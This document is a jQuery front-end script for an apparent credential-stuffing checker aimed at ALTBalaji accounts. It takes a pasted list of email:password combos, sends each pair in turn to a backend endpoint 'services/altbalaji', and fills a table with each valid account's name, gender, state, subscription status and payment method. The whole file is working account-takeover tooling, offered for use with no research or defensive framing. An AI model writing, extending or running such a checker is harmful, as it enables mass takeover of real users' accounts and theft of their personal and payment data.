var splited;
$( document ).ready(function() {
    $("#submitForm").click(function(){
        var textArea = $("#accounts").val();
        splited = textArea.split("\n").map(e=>e.split(' ')[0]).filter(e=>validateEmail(e.split(':')[0]));
        promises(splited.map(e=>e.split(' ')[0]),0);
        console.log("splited",splited);

    });
});

function promises(arr,i){
    if(i === arr.length)
        return;
    $.post(
        {
            type:'POST',
            url:'services/altbalaji',
            contentType: 'application/json',
            data: JSON.stringify({
                login:arr[i].split(":")[0],
                password:arr[i].split(":")[1]
            }),
            success: function(data) {
                promises(arr,i+1);
                console.log('post success');
                console.log(JSON.stringify(data));
                prependerModified(data);
            },
            error: function(data) {
                promises(arr,i+1);
                console.log('post error');
                console.log(JSON.stringify(data));
            }
        }
    )
    $('#progressBar').css('width',(i+1) / splited.length * 100 +"%");

}



function prependerModified(account) {
    var
        email = account.accountLogin.email,
        password = account.accountLogin.password,
        surname = 'X',
        name='X',
        gender='X',
        state='X',
        email_verified='X',
        payment_type= 'X',
        amount='X',
        is_free='X',
        end='X',
        start='X',
        status='X',
        is_trial='X',
        payment_method='X'
    ;
    if (account.validAccount) {
        surname = account.accountInfo.surname;
        name=account.accountInfo.name;
        gender=account.accountInfo.gender;
        state=account.accountInfo.state;
        email_verified=account.accountInfo.email_verified;
            payment_type=account.accountInfo.paymentInfo.payment_type;
            amount=account.accountInfo.paymentInfo.amount;
            is_free=account.accountInfo.paymentInfo.is_free;
            start=account.accountInfo.paymentInfo.start;
            end=account.accountInfo.paymentInfo.end;
            status=account.accountInfo.paymentInfo.status;
            is_trial=account.accountInfo.paymentInfo.is_trial;
            payment_method=account.accountInfo.paymentInfo.payment_method;


    }
    $('tbody').prepend('<tr>' +
        '      <th scope="row">' + account.validAccount + '</th>' +
        '      <td>' + email + '</td>' +
        '      <td>' + password + '</td>' +
        '      <td>' + surname + '</td>' +
        '      <td>' + name + '</td>' +
        '      <td>' + gender + '</td>' +
        '      <td>' + state + '</td>' +
        '      <td>' + email_verified + '</td>' +
        '      <td>' + payment_type + '</td>' +
        '      <td>' + amount + '</td>' +
        '      <td>' + is_free + '</td>' +
        '      <td>' + start + '</td>' +
        '      <td>' + end + '</td>' +
        '      <td>' + status + '</td>' +
        '      <td>' + is_trial + '</td>' +
        '      <td>' + payment_method + '</td>' +
        '    </tr>')

}
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
